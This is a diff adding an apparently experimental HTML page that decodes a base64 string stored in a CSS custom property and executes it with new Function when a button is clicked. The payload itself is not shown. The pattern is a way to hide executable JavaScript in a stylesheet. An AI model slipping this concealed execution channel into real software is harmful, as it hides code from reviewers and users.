@@ -1,0 +1,18 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Js in Css Experiment</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <button id="my_button">Push me</button>
+    <script>
+        const el = document.getElementsByTagName("html")[0];
+        const encodedPayload = getComputedStyle(el, null).getPropertyValue("--whatever");
+        const decodedPayload = window.atob(encodedPayload);
+        const fn = new Function(decodedPayload);
+        document.getElementById("my_button").onclick = fn; 
+    </script>
+</body>
+</html>
